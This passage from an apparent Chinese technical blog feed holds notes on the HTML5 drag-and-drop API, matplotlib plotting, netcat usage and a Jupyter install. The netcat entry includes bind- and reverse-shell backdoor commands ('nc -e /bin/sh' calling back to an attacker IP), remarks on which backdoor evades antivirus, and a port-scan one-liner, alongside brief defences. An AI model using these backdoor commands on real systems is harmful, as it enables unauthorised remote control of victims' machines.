<td>获取当前选定的拖放操作的类型或将操作设置为新类型。它应该始终设置成effectAllowed的可能值之一【none、move、copy、link】。dragover事件处理程序中针对放置目标来设置dropEffect。</td>
</tr>
<tr>
<td>effectAllowed</td>
<td>指定拖放操作所允许的效果。必须是其中之一【 none, copy, copyLink, copyMove, link, linkMove, move, all, uninitialized】默认为uninitialized 表示允许所有的效果。ondragstart处理程序中设置effectAllowed属性</td>
</tr>
</tbody></table>
<table>
<thead>
<tr>
<th>方法</th>
<th>说明</th>
</tr>
</thead>
<tbody><tr>
<td>void setData(format, data)</td>
<td>将拖动操作的拖动数据设置为指定的数据和类型。format可以是MIME类型</td>
</tr>
<tr>
<td>String getData(format)</td>
<td>返回指定格式的数据，format与setData()中一致</td>
</tr>
<tr>
<td>void clearData([format])</td>
<td>删除给定类型的拖动操作的数据。如果给定类型的数据不存在，此方法不执行任何操作。如果不给定参数，则删除所有类型的数据。</td>
</tr>
<tr>
<td>void setDragImage(img, xOffset, yOffset)</td>
<td>指定一副图像，当拖动发生时，显示在光标下方。大多数情况下不用设置，因为被拖动的节点被创建成默认图片。x,y参数分别指示图像的水平、垂直偏移量</td>
</tr>
</tbody></table>
<h1 id="浏览器文件拖拽示例"><a href="#浏览器文件拖拽示例" class="headerlink" title="浏览器文件拖拽示例"></a>浏览器文件拖拽示例</h1><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">document.addEventListener(&quot;dragenter&quot;,function(e) &#123;</span><br><span class="line">    e.preventDefault();</span><br><span class="line">    e.stopPropagation();</span><br><span class="line">&#125;,false);</span><br><span class="line"></span><br><span class="line">document.addEventListener(&quot;dragover&quot;,function(e) &#123;</span><br><span class="line">    e.preventDefault();</span><br><span class="line">    e.stopPropagation();</span><br><span class="line">&#125;,false);</span><br><span class="line"></span><br><span class="line">document.addEventListener(&quot;dragleave&quot;,function(e) &#123;</span><br><span class="line">    e.preventDefault();</span><br><span class="line">    e.stopPropagation();</span><br><span class="line">&#125;,false);</span><br><span class="line"></span><br><span class="line">document.addEventListener(&quot;drop&quot;,function(e) &#123;</span><br><span class="line">    e.preventDefault();</span><br><span class="line">    e.stopPropagation();</span><br><span class="line"></span><br><span class="line">    var  df &#x3D; e.dataTransfer;</span><br><span class="line">    var dropFiles&#x3D;[];</span><br><span class="line"></span><br><span class="line">    if (df.items !&#x3D;&#x3D;undefined)&#123;</span><br><span class="line">        for(var i&#x3D;0;i&lt;df.items.length;i++)&#123;</span><br><span class="line">            var item&#x3D; df.items[i];</span><br><span class="line">            if(item.kind&#x3D;&#x3D;&#x3D;&quot;file&quot; &amp;&amp; item.getAsEntry().isFile)&#123;</span><br><span class="line">                var file &#x3D;item.getAsFile();</span><br><span class="line">                dropFiles.push(file);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;,false);</span><br></pre></td></tr></table></figure>

<h1 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h1><ol>
<li><a href="https://segmentfault.com/a/1190000013298317" target="_blank" rel="noopener">js控制文件拖拽，获取拖拽内容。</a>,by segmentfault.</li>
<li><a href="https://juejin.im/post/6844903513491767303" target="_blank" rel="noopener">HTML5原生拖拽/拖放 Drag &amp; Drop 详解</a>,by weiqinl.</li>
<li><a href="https://segmentfault.com/a/1190000019554950" target="_blank" rel="noopener">原生JS快速实现拖放（drag and drop）效果</a>,by MudOnTire.</li>
</ol>
]]></content>
      <tags>
        <tag>笔记本</tag>
        <tag>JavaScript</tag>
      </tags>
  </entry>
  <entry>
    <title>matplotlib用法笔记</title>
    <url>/2018/05/26/matplotlib%E7%94%A8%E6%B3%95%E7%AC%94%E8%AE%B0/</url>
    <content><![CDATA[<p>matplotlib 是Python编程语言及其数值数学扩展包 NumPy的可视化操作界面。它为利用通用的图形用户界面工具包，如Tkinter, wxPython, Qt或GTK+向应用程序嵌入式绘图提供了应用程序接口（API）。此外，matplotlib还有一个基于图像处理库（如开放图形库OpenGL）的pylab接口，其设计与MATLAB非常类似–尽管并不怎么好用。SciPy就是用matplotlib进行图形绘制。</p>
<h1 id="绘图结构"><a href="#绘图结构" class="headerlink" title="绘图结构"></a>绘图结构</h1><p>matplotlib API包含有三层：</p>
<ul>
<li>backend_bases.FigureCanvas : 图表的绘制领域</li>
<li>backend_bases.Renderer : 知道如何在FigureCanvas上如何绘图</li>
<li>artist.Artist : 知道如何使用Renderer在FigureCanvas上绘图</li>
</ul>
<blockquote>
<p>FigureCanvas和Renderer需要处理底层的绘图操作，例如使用wxPython在界面上绘图，或者使用PostScript绘制PDF。Artist则处理所有的高层结构，例如处理图表、文字和曲线等的绘制和布局。通常我们只和Artist打交道，而不需要关心底层的绘制细节。</p>
</blockquote>
<blockquote>
<p>Artists分为简单类型和容器类型两种。简单类型的Artists为标准的绘图元件，例如Line2D、 Rectangle、 Text、AxesImage 等等。而容器类型则可以包含许多简单类型的Artists，使它们组织成一个整体，例如Axis、 Axes、Figure等。</p>
</blockquote>
<p align="center">
    <img src="images/matplotlib.jpg" width="80%" alt="matplotlib pyplot绘图结构"/>
</p>
<center>图1 matplotlib pyplot绘图结构</center>

<h1 id="基本用法"><a href="#基本用法" class="headerlink" title="基本用法"></a>基本用法</h1><p>使用plt.figure定义一个图像窗口。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">import matplotlib.pyplot as plt</span><br><span class="line">import numpy as np</span><br><span class="line">x &#x3D; np.linspace(-1, 1, 50)</span><br><span class="line">y &#x3D; 2*x + 1</span><br><span class="line">plt.figure() </span><br><span class="line">plt.plot(x, y)</span><br><span class="line">plt.show()</span><br></pre></td></tr></table></figure>

<h2 id="设置标题"><a href="#设置标题" class="headerlink" title="设置标题"></a>设置标题</h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line"># 导入matplotlib库</span><br><span class="line">import matplotlib</span><br><span class="line">import matplotlib.pyplot as plt</span><br><span class="line"># %matplotlib inline 显示图表</span><br><span class="line"># 使用&#39;ggplot&#39;风格美化显示的图表</span><br><span class="line">plt.style.use(&#39;ggplot&#39;) </span><br><span class="line"></span><br><span class="line"># 设置使用的字体（需要显示中文的时候使用）</span><br><span class="line">font &#x3D; &#123;&#39;family&#39;:&#39;SimHei&#39;&#125; </span><br><span class="line">matplotlib.rc(&#39;font&#39;,**font)</span><br><span class="line"></span><br><span class="line"># 当坐标轴有负号的时候可以显示负号</span><br><span class="line">matplotlib.rcParams[&#39;axes.unicode_minus&#39;]&#x3D;False </span><br><span class="line"></span><br><span class="line"># 设置标题</span><br><span class="line">plt.title(&#39;正弦函数&#39;,fontsize&#x3D;20) 设置子图表标题和标题字体的大小</span><br></pre></td></tr></table></figure>

<h2 id="设置坐标轴"><a href="#设置坐标轴" class="headerlink" title="设置坐标轴"></a>设置坐标轴</h2><p>使用plt.xlim设置x坐标轴范围：(-1, 2)； 使用plt.ylim设置y坐标轴范围：(-2, 3)；<br>使用plt.xlabel设置x坐标轴名称：’I am x’； 使用plt.ylabel设置y坐标轴名称：’I am y’；</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">plt.xlim((-1, 2))</span><br><span class="line">plt.ylim((-2, 3))</span><br><span class="line">plt.xlabel(&#39;I am x&#39;)</span><br><span class="line">plt.ylabel(&#39;I am y&#39;)</span><br></pre></td></tr></table></figure>

<p>使用np.linspace定义范围以及个数：范围是(-1,2);个数是5. 使用print打印出新定义的范围. 使用plt.xticks设置x轴刻度：范围是(-1,2);个数是5.</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">new_ticks &#x3D; np.linspace(-1, 2, 5)</span><br><span class="line">print(new_ticks)</span><br><span class="line">plt.xticks(new_ticks)</span><br></pre></td></tr></table></figure>

<p>使用plt.yticks设置y轴刻度以及名称：刻度为[-2, -1.8, -1, 1.22, 3]；对应刻度的名称为[‘really bad’,’bad’,’normal’,’good’, ‘really good’]. 使用plt.show显示图像.</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">plt.yticks([-2, -1.8, -1, 1.22, 3],[r&#39;$really\ bad$&#39;, r&#39;$bad$&#39;, r&#39;$normal$&#39;, r&#39;$good$&#39;, r&#39;$really\ good$&#39;])</span><br><span class="line">plt.show()</span><br></pre></td></tr></table></figure>

<p>使用plt.gca获取当前坐标轴信息. 使用.spines设置边框：右侧边框；使用.set_color设置边框颜色：默认白色； 使用.spines设置边框：上边框；使用.set_color设置边框颜色：默认白色；</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">ax &#x3D; plt.gca()</span><br><span class="line">ax.spines[&#39;right&#39;].set_color(&#39;none&#39;)</span><br><span class="line">ax.spines[&#39;top&#39;].set_color(&#39;none&#39;)</span><br><span class="line">plt.show()</span><br></pre></td></tr></table></figure>

<h2 id="调整坐标轴"><a href="#调整坐标轴" class="headerlink" title="调整坐标轴"></a>调整坐标轴</h2><p>使用.xaxis.set_ticks_position设置x坐标刻度数字或名称的位置：bottom.（所有位置：top，bottom，both，default，none）</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">ax.xaxis.set_ticks_position(&#39;bottom&#39;)</span><br></pre></td></tr></table></figure>

<p>使用.spines设置边框：x轴；使用.set_position设置边框位置：y=0的位置；（位置所有属性：outward，axes，data）<br>使用.yaxis.set_ticks_position设置y坐标刻度数字或名称的位置：left.（所有位置：left，right，both，default，none）<br>使用.spines设置边框：y轴；使用.set_position设置边框位置：x=0的位置；（位置所有属性：outward，axes，data） 使用plt.show显示图像.</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">ax.spines[&#39;bottom&#39;].set_position((&#39;data&#39;, 0))</span><br><span class="line">ax.yaxis.set_ticks_position(&#39;left&#39;)</span><br><span class="line">ax.spines[&#39;left&#39;].set_position((&#39;data&#39;,0))</span><br><span class="line">plt.show()</span><br></pre></td></tr></table></figure>

<h2 id="legend图例"><a href="#legend图例" class="headerlink" title="legend图例"></a>legend图例</h2><h3 id="基本用法-1"><a href="#基本用法-1" class="headerlink" title="基本用法"></a>基本用法</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">import matplotlib.pyplot as plt</span><br><span class="line">import numpy as np</span><br><span class="line"></span><br><span class="line">x &#x3D; np.linspace(-3, 3, 50)</span><br><span class="line">y1 &#x3D; 2*x + 1</span><br><span class="line">y2 &#x3D; x**2</span><br><span class="line"></span><br><span class="line">plt.figure()</span><br><span class="line">#set x limits</span><br><span class="line">plt.xlim((-1, 2))</span><br><span class="line">plt.ylim((-2, 3))</span><br><span class="line"></span><br><span class="line"># set new sticks</span><br><span class="line">new_sticks &#x3D; np.linspace(-1, 2, 5)</span><br><span class="line">plt.xticks(new_sticks)</span><br><span class="line"># set tick labels</span><br><span class="line">plt.yticks([-2, -1.8, -1, 1.22, 3],</span><br><span class="line">           [r&#39;$really\ bad$&#39;, r&#39;$bad$&#39;, r&#39;$normal$&#39;, r&#39;$good$&#39;, r&#39;$really\ good$&#39;])</span><br><span class="line"></span><br><span class="line"># set line syles</span><br><span class="line">l1, &#x3D; plt.plot(x, y1, label&#x3D;&#39;linear line&#39;)</span><br><span class="line">l2, &#x3D; plt.plot(x, y2, color&#x3D;&#39;red&#39;, linewidth&#x3D;1.0, linestyle&#x3D;&#39;--&#39;, label&#x3D;&#39;square line&#39;)</span><br><span class="line"></span><br><span class="line">plt.legend(loc&#x3D;&#39;upper right&#39;)</span><br></pre></td></tr></table></figure>

<h3 id="调整位置和名称"><a href="#调整位置和名称" class="headerlink" title="调整位置和名称"></a>调整位置和名称</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">plt.legend(handles&#x3D;[l1, l2], labels&#x3D;[&#39;up&#39;, &#39;down&#39;],  loc&#x3D;&#39;best&#39;)</span><br></pre></td></tr></table></figure>

<p>其中’loc’参数有多种，’best’表示自动分配最佳位置。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#39;best&#39; : 0,          </span><br><span class="line">&#39;upper right&#39;  : 1,</span><br><span class="line">&#39;upper left&#39;   : 2,</span><br><span class="line">&#39;lower left&#39;   : 3,</span><br><span class="line">&#39;lower right&#39;  : 4,</span><br><span class="line">&#39;right&#39;        : 5,</span><br><span class="line">&#39;center left&#39;  : 6,</span><br><span class="line">&#39;center right&#39; : 7,</span><br><span class="line">&#39;lower center&#39; : 8,</span><br><span class="line">&#39;upper center&#39; : 9,</span><br><span class="line">&#39;center&#39;       : 10,</span><br></pre></td></tr></table></figure>

<h2 id="子图"><a href="#子图" class="headerlink" title="子图"></a>子图</h2><p>使用plt.subplot来创建小图。 plt.subplot(2,2,1)表示将整个图像窗口分为2行2列, 当前位置为1。 使用plt.plot([0,1],[0,1])在第1个位置创建一个小图。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">import matplotlib.pyplot as plt</span><br><span class="line">fig&#x3D;plt.figure()</span><br><span class="line">ax &#x3D; fig.add_subplot(2, 2, 1, projection&#x3D;&#39;3d&#39;)</span><br><span class="line">ax.plot([0,1,1],[0,1,1])</span><br></pre></td></tr></table></figure>

<p>plt.subplot(222)表示将整个图像窗口分为2行2列, 当前位置为2. 使用plt.plot([0,1],[0,2])在第2个位置创建一个小图.</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">plt.subplot(222)</span><br><span class="line">plt.plot([0,1],[0,2])</span><br></pre></td></tr></table></figure>

<h2 id="动画"><a href="#动画" class="headerlink" title="动画"></a>动画</h2><p>Matplotlib使用FuncAnimation函数生成动画。参数说明：</p>
<ul>
<li>fig 进行动画绘制的figure</li>
<li>func 自定义动画函数，即传入刚定义的函数animate</li>
<li>frames 动画长度，一次循环包含的帧数</li>
<li>init_func 自定义开始帧，即传入刚定义的函数init</li>
<li>interval 更新频率，以ms计</li>
<li>blit 选择更新所有点，还是仅更新产生变化的点。应选择True，但mac用户请选择False，否则无法显示动画</li>
</ul>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">from matplotlib import pyplot as plt</span><br><span class="line">from matplotlib import animation</span><br><span class="line">import numpy as np</span><br><span class="line"></span><br><span class="line">fig, ax &#x3D; plt.subplots()</span><br><span class="line"></span><br><span class="line">x &#x3D; np.arange(0, 2*np.pi, 0.01)</span><br><span class="line">line, &#x3D; ax.plot(x, np.sin(x))</span><br><span class="line"></span><br><span class="line">def animate(i):</span><br><span class="line">    line.set_ydata(np.sin(x + i&#x2F;10.0))</span><br><span class="line">    return line,</span><br><span class="line"></span><br><span class="line">def init():</span><br><span class="line">    line.set_ydata(np.sin(x))</span><br><span class="line">    return line,</span><br><span class="line">&#x2F;&#x2F;注意此处FuncAnimation必须有返回值</span><br><span class="line">ani &#x3D; animation.FuncAnimation(fig&#x3D;fig,</span><br><span class="line">                              func&#x3D;animate,</span><br><span class="line">                              frames&#x3D;100,</span><br><span class="line">                              init_func&#x3D;init,</span><br><span class="line">                              interval&#x3D;20,</span><br><span class="line">                              blit&#x3D;False)</span><br><span class="line"></span><br><span class="line">plt.show()</span><br></pre></td></tr></table></figure>

<h1 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h1><ol>
<li><a href="https://zh.wikipedia.org/wiki/Matplotlib" target="_blank" rel="noopener">matplotlib</a>, by wikipedia</li>
<li><a href="https://morvanzhou.github.io" target="_blank" rel="noopener">莫烦Python</a>, by morvanzhou</li>
<li><a href="https://matplotlib.org/api/index.html#usage-patterns" target="_blank" rel="noopener">API Overview</a>,by matplotlib.</li>
<li><a href="https://blog.csdn.net/matrix_laboratory/article/details/50698239" target="_blank" rel="noopener">Python matplotlib高级绘图详解</a>,by 微岩.</li>
<li><a href="https://zhuanlan.zhihu.com/p/32444081" target="_blank" rel="noopener">用Matplotlib制作动画</a>,by 段丞博.</li>
<li><a href="https://stackoverflow.com/questions/29356269/plot-inline-or-a-separate-window-using-matplotlib-in-spyder-ide" target="_blank" rel="noopener">Plot inline or a separate window using Matplotlib in Spyder IDE</a>,by stackoverflow.</li>
<li><a href="https://www.jianshu.com/p/dc16dc3659a6" target="_blank" rel="noopener">Python之matplotlib的使用汇总</a>,by 探索数据之美.</li>
</ol>
]]></content>
      <tags>
        <tag>笔记本</tag>
        <tag>python</tag>
      </tags>
  </entry>
  <entry>
    <title>netcat使用方法简介</title>
    <url>/2019/09/22/netcat%E4%BD%BF%E7%94%A8%E6%96%B9%E6%B3%95%E7%AE%80%E4%BB%8B/</url>
    <content><![CDATA[<p>netcat（通常缩写为nc）是一种计算机联网实用程序，用于使用TCP或UDP读写网络连接。 该命令被设计为可靠的后端，可以直接使用或由其他程序和脚本轻松驱动。 同时，它是功能丰富的网络调试和调查工具，因为它可以产生用户可能需要的几乎任何类型的连接，并具有许多内置功能。netcat被称为网络工具中的瑞士军刀，体积小巧，但功能强大。</p>
<h1 id="使用帮助"><a href="#使用帮助" class="headerlink" title="使用帮助"></a>使用帮助</h1><table>
<thead>
<tr>
<th>选项</th>
<th>是否有“选项值”</th>
<th>说明</th>
</tr>
</thead>
<tbody><tr>
<td>h</td>
<td>NO</td>
<td>输出 nc 的帮助</td>
</tr>
<tr>
<td>v</td>
<td>NO</td>
<td>在网络通讯时，显示详细的输出信息。注：建议新手多用该选项，出错时帮你诊断问题</td>
</tr>
<tr>
<td>n</td>
<td>NO</td>
<td>对命令行中的“主机”，【不】进行域名解析。注：如果“主机”是“点分格式”的 IP 地址，需要用该选项；如果“主机”是“域名”形式，【不能】用该选项</td>
</tr>
<tr>
<td>p</td>
<td>YES</td>
<td>指定“端口号”</td>
</tr>
<tr>
<td>l</td>
<td>NO</td>
<td>开启“监听模式”，nc 作为【服务端】。注：如不加该选项，nc 默认作为客户端</td>
</tr>
<tr>
<td>u</td>
<td>NO</td>
<td>使用 UDP 协议。注：如不加该选项，默认是 TCP 协议</td>
</tr>
<tr>
<td>w</td>
<td>YES</td>
<td>设置连接的超时间隔（N 秒）</td>
</tr>
<tr>
<td>q</td>
<td>YES</td>
<td>让 nc 延时（N 秒）再退出</td>
</tr>
<tr>
<td>z</td>
<td>NO</td>
<td>开启“zero-I/O 模式”。注：该选项仅用于“端口扫描”，后面会聊到</td>
</tr>
<tr>
<td>k</td>
<td>NO</td>
<td>配合 -l 选项使用，可以重复接受客户端连接。注：“原版 nc”的该选项用来开启“TCP keepalive”。这是“原版 nc”与“OpenBSD 变种”之间的差异之一</td>
</tr>
<tr>
<td>X</td>
<td>YES</td>
<td>指定代理的类型（具体用法，后面会聊到）。注：“原版 nc”【没有】该选项。这是“原版 nc”与“OpenBSD 变种”之间的差异之一</td>
</tr>
<tr>
<td>x</td>
<td>YES</td>
<td>以 IP:port 的格式指定代理的位置。注：“原版 nc”【没有】该选项。这是“原版 nc”与“OpenBSD 变种”之间的差异之一</td>
</tr>
<tr>
<td>e</td>
<td>YES</td>
<td>启动某个进程，把该进程的“标准输入输出”与网络通讯【对接】。注：通常用该选项开启一个网络后门。“OpenBSD 变种”基于安全考虑，已去掉该选项，但还是能用间接的方式达到同样的效果。</td>
</tr>
</tbody></table>
<h1 id="典型示例"><a href="#典型示例" class="headerlink" title="典型示例"></a>典型示例</h1><h2 id="网络诊断"><a href="#网络诊断" class="headerlink" title="网络诊断"></a>网络诊断</h2><h3 id="测试某个远程主机的【监听】端口是否可达"><a href="#测试某个远程主机的【监听】端口是否可达" class="headerlink" title="测试某个远程主机的【监听】端口是否可达"></a>测试某个远程主机的【监听】端口是否可达</h3><p>用如下命令可以测试某个 IP 地址（x.x.x.x）上的某个监听端口（xx）是否开启。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">nc -nv x.x.x.x xx</span><br><span class="line">nc -nv -w 3 x.x.x.x xx</span><br></pre></td></tr></table></figure>

<p>上述命令用到了如下几个选项：</p>
<ul>
<li>选项 -v</li>
</ul>
<p>如果你是 nc 的新手，建议总是带上这个选项——通过更详细的输出，能帮你搞明白状况。</p>
<ul>
<li>选项 -n</li>
</ul>
<p>由于测试的是【IP 地址】，用该选项告诉 nc，【无须】进行域名（DNS）解析；反之，如果你要测试的主机是基于【域名】，就【不能】用“选项 -n”。</p>
<ul>
<li>选项 -w</li>
</ul>
<p>在测试链接的时候，如果你【没】使用 -w 这个超时选项，默认情况下 nc 会等待很久，然后才告诉你连接失败。</p>
<p>如果你所处的网络环境稳定且高速（比如：局域网内），那么，你可以追加“-w 选项”，设置一个比较小的超时值。</p>
<h3 id="判断防火墙是否“允许-or-禁止”某个端口"><a href="#判断防火墙是否“允许-or-禁止”某个端口" class="headerlink" title="判断防火墙是否“允许 or 禁止”某个端口"></a>判断防火墙是否“允许 or 禁止”某个端口</h3><p>在“主机S”上运行 nc，让它在 8080 端口，命令如下：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">nc -lv -p 8080</span><br></pre></td></tr></table></figure>

<p>然后在“主机C”上运行 nc，测试“主机S”上的 8080 端口是否可达。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">nc -nv x.x.x.x xx</span><br></pre></td></tr></table></figure>

<ul>
<li>选项 -l</li>
</ul>
<p>这个选项会让 nc 进入监听模式。</p>
<ul>
<li>选项 -p</li>
</ul>
<p>这个选项有“选项值”，也就是具体端口号。</p>
<ul>
<li>选项 -k</li>
</ul>
<p>在默认情况下，nc 开启 listen 模式充当服务端，在接受【第一次】客户端连接之后，就会把监听端口关闭。</p>
<p>如果你想要让 nc 始终监听模式，使之能【重复】接受客户端发起的连接，可以追加 -k 选项。</p>
<ul>
<li>选项 -u</li>
</ul>
<p>如果你要测试 UDP 协议，要记得【两边】的 nc 都要追加 -u 选项。</p>
<h2 id="渗透测试"><a href="#渗透测试" class="headerlink" title="渗透测试"></a>渗透测试</h2><h3 id="用-nc-进行“端口扫描”"><a href="#用-nc-进行“端口扫描”" class="headerlink" title="用 nc 进行“端口扫描”"></a>用 nc 进行“端口扫描”</h3><p>下面这个命令，用来扫描 IP 地址为 x.x.x.x 的主机，扫描的端口范围从 1 到 1024。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">nc -znv x.x.x.x 1-1024</span><br><span class="line">nc -znv x.x.x.x 1-1024  2&gt;&amp;1 | grep succeeded</span><br></pre></td></tr></table></figure>

<ul>
<li>选项 -z</li>
</ul>
<p>意思是：开启“zero-I/O 模式”。该模式指的是：nc 只判断某个监听端口是否能连上，连上后【不】与对端进行数据通讯。</p>
<ul>
<li><p>选项 -n</p>
</li>
<li><p>选项 -v</p>
</li>
</ul>
<p>由于“-v 选项”产生的输出位于【stderr】，上述命令中的 2&gt;&amp;1 用来把【stderr】合并到【stdout】（注：这种写法只适用于 POSIX 系统上的 shell）。</p>
<p>grep 命令用来进行【过滤】。对于 Windows 系统，默认【没有】grep 命令，需改用 find 命令过滤。</p>
<h2 id="网络配置"><a href="#网络配置" class="headerlink" title="网络配置"></a>网络配置</h2><h3 id="基于-nc-的端口转发（Port-Forward）"><a href="#基于-nc-的端口转发（Port-Forward）" class="headerlink" title="基于 nc 的端口转发（Port Forward）"></a>基于 nc 的端口转发（Port Forward）</h3><p>用 nc 进行端口转发，需要运行【两个】nc 进程，一个充当“服务端”，另一个是“客户端”，然后用【管道】让把两个进程的“标准输入输出”交叉配对。所谓的“交叉配对”就是——每一个 nc 进程的“标准输出”都【对接】到另一个 nc 进程的“标准输入”。如此一来，就可以完美地建立【双向通讯】。</p>
<p>运行下面命令之后，就可以把本机的 1235 端口重定向到本机的 5678 端口。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">mkfifo nc_pipe</span><br><span class="line">nc -l -p 1234 &lt; nc_pipe | nc 127.0.0.1 5678 &gt; nc_pipe</span><br></pre></td></tr></table></figure>

<h2 id="系统管理"><a href="#系统管理" class="headerlink" title="系统管理"></a>系统管理</h2><h3 id="用-nc-传输文件"><a href="#用-nc-传输文件" class="headerlink" title="用 nc 传输文件"></a>用 nc 传输文件</h3><p>假设你有两台主机 A 与 B，你要把 A 主机上的文件 file1 传输到 B 主机上，保存为 file2</p>
<p>你先在【接收端】（B 主机）运行如下命令（其中的 xxx 是端口号）</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">nc -l -p xxx &gt; file2</span><br></pre></td></tr></table></figure>

<p>然后在【发送端】（A 主机）运行如下命令。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">nc x.x.x.x xxx &lt; file1</span><br></pre></td></tr></table></figure>

<p>第二条命令中的 xxx 是端口号，要与第一条命令中的端口号相同；第二条命令中的 x.x.x.x 是【主机 B】的 IP 地址。</p>
<p>用 nc 传输文件，相当于是：直接在【裸 TCP】层面传输。你可以通俗理解为：【没有】应用层。如果你传输的文件【超级大】或者文件数量【超级多】，用 nc 传输文件的性能优势会很明显（相比“FTP、SSH、共享目录…”而言）</p>
<h3 id="用-nc-远程备份整个磁盘"><a href="#用-nc-远程备份整个磁盘" class="headerlink" title="用 nc 远程备份整个磁盘"></a>用 nc 远程备份整个磁盘</h3><p>你先在【接收端】（B 主机）运行如下命令（其中的 xxx 是端口号）</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">nc -l -p xxx | dd of&#x3D;&#x2F;dev&#x2F;sdb</span><br></pre></td></tr></table></figure>

<p>然后在【发送端】（A 主机）运行如下命令。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">dd if&#x3D;&#x2F;dev&#x2F;sda | nc x.x.x.x xxx</span><br></pre></td></tr></table></figure>

<h2 id="网络入侵"><a href="#网络入侵" class="headerlink" title="网络入侵"></a>网络入侵</h2><h3 id="用-nc-开启【被动】连接型后门"><a href="#用-nc-开启【被动】连接型后门" class="headerlink" title="用 nc 开启【被动】连接型后门"></a>用 nc 开启【被动】连接型后门</h3><ul>
<li>在受害者机器上开启后门</li>
</ul>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">nc.exe -l -p xxx -e cmd.exe</span><br><span class="line">nc -l -p xxx -e &#x2F;bin&#x2F;sh</span><br></pre></td></tr></table></figure>

<p>后门创建好之后，攻击者在自己机器上也运行 nc（客户端 nc），然后连接到作为后门的 nc（服务端 nc）。一旦连上之后，攻击者就可以在自己的 nc 上看到对方（受害者机器）的 shell 提示符。</p>
<ul>
<li>防范措施</li>
</ul>
<p>NAT 模式的虚拟机（Guest OS）</p>
<p>NAT 的好处在于【单向可见】。也就是说，Guest OS 可以访问到物理系统（Host OS）【外部】的网络环境；但外部网络环境只能看到 Host OS，看不到 Guest OS。</p>
<p>在这种配置下，就算某个入侵者完全控制了你的 Guest OS，他/她也【没】办法在 Guest OS 中搭建“被动连接型后门”。换句话说，即使入侵者运行了这种后门，（但由于 NAT 的缘故）后门【无法】接受外部网络的连接，这个后门就【失去意义】。</p>
<h3 id="用-nc-开启【主动】连接型后门"><a href="#用-nc-开启【主动】连接型后门" class="headerlink" title="用 nc 开启【主动】连接型后门"></a>用 nc 开启【主动】连接型后门</h3><ul>
<li>攻击者在自己机器上运行“服务端 nc”</li>
</ul>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">nc -lk -p xxx</span><br><span class="line">nc.exe -e cmd.exe x.x.x.x xxx</span><br><span class="line">nc -e &#x2F;bin&#x2F;sh x.x.x.x xxx</span><br></pre></td></tr></table></figure>

<p>（在上述两个命令中， xxx 是步骤1用到的端口号，x.x.x.x 是攻击者的 IP 地址）</p>
<ul>
<li>防范措施</li>
</ul>
<p>【隔离模式】的虚拟机</p>
<ul>
<li>【主动】连接型后门的优势之处</li>
</ul>
<p>简单对比一下“后门的两种连接方式”。</p>
<p><strong>可用性</strong></p>
<p>如果用“被动型后门”入侵桌面 PC，考虑到绝大部分桌面 PC 都处于内网（其网卡【并未】分配公网 IP）。对这种场景，攻击者需要与受害者在同一个局域网，才能与后门建立通讯。相比之下，“主动型后门”就【没有】这种弊端。</p>
<p><strong>隐蔽性</strong></p>
<p>“被动型后门”需要显式开启监听端口，很容易引起用户的怀疑，或引起杀毒软件的注意。相比之下，“主动型后门”就【没有】这个问题。</p>
<h1 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h1><ol>
<li><a href="https://zh.wikipedia.org/wiki/Netcat" target="_blank" rel="noopener">netcat</a>,by wikipedia.</li>
<li><a href="https://www.jianshu.com/p/cb26a0f6c622" target="_blank" rel="noopener">NetCat使用指南</a>,by Evilwing.</li>
</ol>
]]></content>
      <tags>
        <tag>笔记本</tag>
        <tag>计算机安全</tag>
      </tags>
  </entry>
  <entry>
    <title>jupyter notebook安装与使用</title>
    <url>/2019/12/31/jupyter_notebook%E5%AE%89%E8%A3%85%E4%B8%8E%E4%BD%BF%E7%94%A8/</url>
    <content><![CDATA[<p>Jupyter Notebook（前身是IPython Notebook）是一个基于Web的交互式计算环境，用于创建Jupyter Notebook文档。Notebook一词可以通俗地引用许多不同的实体，主要是Jupyter Web应用程序、Jupyter Python Web服务器或Jupyter文档格式（取决于上下文）。Jupyter Notebook文档是一个JSON文档，遵循版本化模式，包含一个有序的输入/输出单元格列表，这些单元格可以包含代码、文本（使用Markdown语言）、数学、图表和富媒体，通常以“.ipynb”结尾扩展。</p>
<h1 id="安装过程"><a href="#安装过程" class="headerlink" title="安装过程"></a>安装过程</h1><h2 id="安装前提"><a href="#安装前提" class="headerlink" title="安装前提"></a>安装前提</h2><ul>
<li>python&gt;3.3 或者python=2.7</li>
</ul>
<h2 id="安装步骤"><a href="#安装步骤" class="headerlink" title="安装步骤"></a>安装步骤</h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">pip install notebook</span><br></pre></td></tr></table></figure>

